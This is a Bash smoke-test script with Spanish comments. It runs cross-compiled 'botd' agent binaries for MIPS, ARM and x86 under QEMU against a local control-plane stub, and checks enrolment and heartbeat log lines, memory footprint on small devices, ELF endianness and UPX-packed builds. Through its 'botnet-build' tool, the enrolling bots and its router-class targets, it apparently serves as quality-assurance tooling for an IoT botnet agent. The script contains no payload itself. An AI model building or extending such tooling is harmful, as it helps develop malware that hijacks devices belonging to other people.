#!/usr/bin/env bash
# T-1402: humo por arquitectura contra el stub del plano de control
# (scripts/qemu/stub_api.go). Con qemu-user por arch: arranca dist/botd-<tag>
# con limite de 60 s, exige `ENROLL 201` y `HEARTBEAT 200 ok` en el log,
# mide RSS clase C (tope 3,1 MB en reposo) y exige 0 core dumps en
# dist/qemu-logs/. Sin qemu-user en el host corre el DOBLE nativo:
# botnet-build smoke-double (enroll+heartbeat reales contra el stub) y el
# assert de endianismo sobre el ELF de dist (un binario mal compilado pierde
# la familia entera). El gate QEMU completo queda BLOCKED-HW hasta tener
# qemu-mips{,el}-static / qemu-arm / qemu-aarch64 / qemu-x86_64.
# Uso: smoke.sh [--doble]  (por defecto: auto-deteccion)
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$ROOT"
# shellcheck source=scripts/env.sh
[ -f scripts/env.sh ] && source scripts/env.sh

DIST="${DIST:-dist}"
LOGS="$DIST/qemu-logs"
STUB_ADDR="${STUB_ADDR:-127.0.0.1:0}"
STUB="" # se resuelve tras el bind real
TAGS="amd64 arm64 armv5 armv7 mipsbe mipsle"
RSS_LIMIT_KIB=3174 # 3,1 MB clase C
FORCE_DOUBLE="${1:-}"

qemu_of() {
  case "$1" in
    amd64) echo qemu-x86_64 ;;
    arm64) echo qemu-aarch64 ;;
    armv5|armv7) echo qemu-arm ;;
    mipsbe) echo qemu-mips ;;
    mipsle) echo qemu-mipsel ;;
  esac
}

# endian ELF: e_ident[EI_DATA] (offset 5): 01=LSB (little), 02=MSB (big).
# ademas e_machine==8 (MIPS). Este es el assert "magic BE" del humo sin
# depender de capture de red.
assert_endian() {
  local tag="$1" f="$2" want
  [ -f "$f" ] || { echo "smoke: sin $f (corre make cross antes)"; return 1; }
  want=$( [ "$tag" = mipsbe ] && echo 02 || echo 01 )
  local data machine
  data=$(od -An -t x1 -j 5 -N 1 "$f" | tr -d ' 
')
  machine=$(od -An -t x1 -j 18 -N 2 "$f" | tr -d ' 
')
  if [ "$tag" = mipsbe ] || [ "$tag" = mipsle ]; then
    if [ "$machine" != "0800" ] && [ "$machine" != "0008" ]; then
      echo "FAIL $tag: e_machine=$machine want 8 (EM_MIPS)"; return 1
    fi
  fi
  if [ "$data" != "$want" ]; then
    echo "FAIL $tag: endianness $data want $want (endianness magic)"
    return 1
  fi
  echo "ok   $tag endianness magic $( [ "$want" = 02 ] && echo BE || echo LE ) OK"
}

mkdir -p "$LOGS"
go build -o "$DIST/stub_api" ./scripts/qemu
"$DIST/stub_api" -addr "$STUB_ADDR" >"$LOGS/stub.log" 2>&1 &
STUB_PID=$!
trap 'kill $STUB_PID 2>/dev/null || true' EXIT

for _ in $(seq 1 40); do
  grep -q 'stub_api listening on' "$LOGS/stub.log" 2>/dev/null && break
  sleep 0.1
done
real=$(sed -n 's/.*listening on //p' "$LOGS/stub.log" | head -1 | tr -d '
')
[ -n "$real" ] || { echo "smoke: el stub no publico direccion (ver $LOGS/stub.log)"; exit 1; }
STUB="http://$real"
# El healthz por si solo no basta: otro servicio en el mismo puerto
# (docker-proxy lo hizo) responderia igual y enmascararia el fallo.
grep -q 'stub_api listening' "$LOGS/stub.log"   || { echo "smoke: el stub no tomo $STUB_ADDR (ver $LOGS/stub.log)"; exit 1; }
curl -fsS "$STUB/healthz" >/dev/null || { echo "smoke: stub no responde healthz"; exit 1; }

qemu_count=0
for tag in $TAGS; do
  q=$(qemu_of "$tag")
  command -v "$q" >/dev/null 2>&1 && qemu_count=$((qemu_count + 1))
done

fail=0
for tag in $TAGS; do
  assert_endian "$tag" "$DIST/botd-$tag" || fail=1
done

if [ "$qemu_count" -eq 6 ] && [ "${FORCE_DOUBLE:-}" != "--doble" ]; then
  # Puerta real: 6/6 archs enrolan y laten en < 60 s con RSS y core-dumps.
  # El empaquetado UPX (stub propio que se automodifica) no sobrevive a
  # qemu-user: se emula la copia desempaquetada en $DIST/raw/ si existe, y
  # se conserva el artefacto empaquetado como lo que se entrega.
  for tag in $TAGS; do
    q=$(qemu_of "$tag")
    bin="$DIST/botd-$tag"
    [ -f "$DIST/raw/botd-$tag" ] && bin="$DIST/raw/botd-$tag"
    log="$LOGS/$tag.log"
    # Bajo qemu-user, /proc del invitado es el del emulador: se mide el
    # pico y se le descuenta la linea base de qemu con un binario trivial,
    # para acercarse al footprint del agente (3,1 MB son de hardware real).
    base=0
    # La sonda se construye si falta: sin línea base, el RSS medido es el del
    # emulador y la puerta de 3,1 MB sería inalcanzable por construcción.
    if [ ! -x "$DIST/raw/probe-$tag" ] && command -v go >/dev/null 2>&1; then
      mkdir -p "$DIST/raw"
      case "$tag" in
        mipsbe) GOARCHV=mips; GOARMV="" ;;
        mipsle) GOARCHV=mipsle; GOARMV="" ;;
        armv5)  GOARCHV=arm; GOARMV=5 ;;
        armv7)  GOARCHV=arm; GOARMV=7 ;;
        *)      GOARCHV="$tag"; GOARMV="" ;;
      esac
      env GOOS=linux GOARCH="$GOARCHV" ${GOARMV:+GOARM="$GOARMV"} CGO_ENABLED=0         go build -trimpath -ldflags "-s -w" -o "$DIST/raw/probe-$tag" ./scripts/qemu/probe 2>/dev/null || true
    fi
    if [ -x "$DIST/raw/probe-$tag" ]; then
      "$q" "$DIST/raw/probe-$tag" >/dev/null 2>&1 &
      pp=$!
      for _ in 1 2 3 4 5 6; do
        v=$(ps -o rss= -p "$pp" 2>/dev/null | tr -d ' ' || true)
        if [ -n "$v" ] && [ "$v" -gt "$base" ]; then base=$v; fi
        sleep 0.2
      done
      wait "$pp" 2>/dev/null || true
    fi
    "$q" "$bin" --smoke --stub "$STUB" >"$log" 2>&1 &
    pid=$!
    rss=0
    for _ in $(seq 1 120); do
      kill -0 "$pid" 2>/dev/null || break
      v=$(ps -o rss= -p "$pid" 2>/dev/null | tr -d ' ' || true)
      if [ -n "$v" ] && [ "$v" -gt "$rss" ]; then rss=$v; fi
      sleep 0.5
    done
    if wait "$pid"; then
      grep -q "HEARTBEAT 200 ok" "$log" && grep -q "ENROLL 201" "$log"         || { echo "FAIL $tag: sin ENROLL 201/HEARTBEAT 200 ok en $log"; fail=1; }
    else
      echo "FAIL $tag: exit != 0 (ver $log)"; fail=1
    fi
    if [ "$tag" = mipsbe ] || [ "$tag" = mipsle ]; then
      delta=$(( rss > base ? rss - base : rss ))
      echo "info $tag RSS pico ${rss} KiB, base qemu ${base} KiB, delta agente ${delta} KiB (tope ${RSS_LIMIT_KIB})"
      [ "$delta" -le "$RSS_LIMIT_KIB" ]         || { echo "FAIL $tag: RSS agente ${delta} KiB > ${RSS_LIMIT_KIB} (clase C 32 MB)"; fail=1; }
    fi
  done
else
  # Doble nativo: el contrato del stub se ejercita con el binario host.
  echo "qemu-smoke: qemu-user disponible para $qemu_count/6 archs -> doble nativo"
  out=$(go run ./cmd/botnet-build smoke-double -stub "$STUB")
  printf '%s\n' "$out"
  printf '%s\n' "$out" | grep -q '^ENROLL 201' || { echo "FAIL doble: sin ENROLL 201"; exit 1; }
  printf '%s\n' "$out" | grep -q '^HEARTBEAT 200 ok' || { echo "FAIL doble: sin HEARTBEAT 200 ok"; exit 1; }
fi

[ "$fail" -eq 0 ] || { echo "qemu-smoke: FAIL"; exit 1; }
if [ "$qemu_count" -eq 6 ]; then
  echo "qemu-smoke: OK 6/6 archs enrolan y laten (<60 s) RSS<=3,1 MB core=0"
else
  echo "qemu-smoke: OK (doble nativo; gate QEMU 6/6 pendiente de qemu-user en host)"
fi
